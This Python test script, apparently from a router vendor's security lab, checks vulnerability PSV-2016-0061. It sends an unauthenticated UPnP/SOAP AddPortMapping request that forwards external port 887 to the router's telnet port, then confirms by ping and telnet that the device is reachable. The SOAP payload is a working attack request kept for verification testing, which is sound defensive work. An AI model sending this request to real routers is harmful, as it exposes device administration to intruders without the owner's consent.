''' [PSV-2016-0061] Issue1 PNP Vulnerable to CSRF '''
''' anthor Cloud 2017-12-07'''
'''v1.0 '''
from API._API import *

def getethermac():
    if console_type != 'cable':
        str = sendCommandAndGetReturn(com,'burnethermac')
        str1 = re.split('mac address -' , str)
        str2 = str1[1]
        str3 =  re.findall('[0-9A-Z]+',str2)
        str4 = str3[0]
    else:
        print 'cable no need burn ethermac'
        str4 = 'None'
    return str4

def getsn():
    if console_type != 'cable':
        str = sendCommandAndGetReturn(com,'burnsn')
        str1 = re.split('serial number -' , str)
        str2 = str1[1]
        str3 =  re.findall('[0-9A-Z]+',str2)
        if str3 == []:
            str4 = 'BTA17C78A003B'
        str4 = str3[0]
    else:
        print 'cable no need burn ethermac'
        str4 = 'None'
    return str4

def test_step_0():
    #log.info( 'step-0-0 dut loaddrfault wait 160s')
    #aploaddefault()
    #log.info( "step-0-1 AP Genie over leap done")
    #Genie_overleap()
    log.info('burn dut ether mac,waiting 160s')
    if console_type == 'cable':
        sendCommandAndGetReturn(com,'cd /')
        sendCommandAndGetReturn(com,'cd non-vol')
        sendCommandAndGetReturn(com,'cd snmp_cm')
        sendCommandAndGetReturn(com,'docsDevSerialNumber BTA17C78A003B')
        sendCommandAndGetReturn(com,'write')
        sendCommandAndGetReturn(com,'cd /')
        sendCommandAndGetReturn(com,'reset')
        time.sleep(100)
        sendCommandAndGetReturn(com,'cd /')
        sendCommandAndGetReturn(com,'/doc/scan_stop')
    else:
        if ProjectName == 'Orbi':
            time.sleep(1)
        else:
            Burnethmac = getethermac()
            Burnsn = getsn()
            print 'DUT original mac:',Burnethmac
            print 'DUT original sn:',Burnsn
            file = open('F:\ATE_script\PSV\mac.txt','w')
            file.write(Burnethmac)
            file.close()
            file = open('F:\ATE_script\PSV\sn.txt','w')
            file.write(Burnsn)
            file.close()
            sendCommandListAndGetReturnUntil('com1', ['burnsku 9', 'burnethermac 00D0591A2B3B','burnsn BTA17C78A003B','reboot'],'#')
            time.sleep(160)
    log.info( "Get dut hostip %s",hostip)
    log.info( "Get dut console_type %s",console_type)
    log.info( "Get dut projectname %s",ProjectName)
    Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info('step-1 Using this vulnerability, BAE Systems was able to add new firewall rules to enable internet access to the insecure telnet port and the admin web interface')
    url = host + urlLogs
    token = getIDToken(url)
    if console_type == 'cable':
        if ProjectName == 'C6300':
            port = '5000'
        else:
            port = '80'
    else:
        port = '80'
    host1 = 'http://' + hostip + ':' + port
    print host1
    headers = {
        'Host': hostip + ':5000',
        'Accept': 'text/xml',
        'SOAPAction': '"urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate"',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Accept-Encoding': 'gzip',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,en,*',
        'User-Agent': 'SOAP Toolkit 3.0',
        'Content-type': 'multipart/form-data',
        'Connection': 'keep-alive'
    }
    post_url = host1 + '/soap/server_sa/'
    print post_url
    if console_type == 'cable':
        data = """<?xml version="1.0"?> 
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>.<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"> 
        <NewPortMappingDescription>EnabledTelnetBySOAP</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration><NewInternalClient>192.168.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>887</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>23</NewInternalPort> .</m:AddPortMapping> </SOAP-ENV:Body> </SOAP-ENV:Envelope>"""
    else:
        data = """<?xml version="1.0"?> 
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"> <SOAP-ENV:Body>.<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"> 
        <NewPortMappingDescription>hax3</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration><NewInternalClient>""" + hostip + """</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>887</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>23</NewInternalPort> .</m:AddPortMapping> </SOAP-ENV:Body> </SOAP-ENV:Envelope>"""
    r = ''
    try:
        r = requests.post(post_url, headers=headers, data=data,timeout=5)
    except:
        time.sleep(1)

def test_Step_2():
    str1 = ping(hostip)
    log.info( 'step-2 check ping dut')
    if str1 == 'true':
        log.info(str1)
        log.info( "PC ping DUT pass")
        time.sleep(1)
    else:
        log.info(str1)
        log.info( "PC ping DUT fail")
    assert str1 == 'true', "This action should work." 

def test_Step_3():
    str2 = judjeduttelnet()
    log.info( 'step-3 check telnet dut')
    if str2 == 'pass':
        log.info(str2)
        log.info( "check telnet dut pass")
        time.sleep(1)
    else:
        log.info(str2)
        log.info( "check telnet dut fail")
    assert str2 == 'pass', "This action should work." 
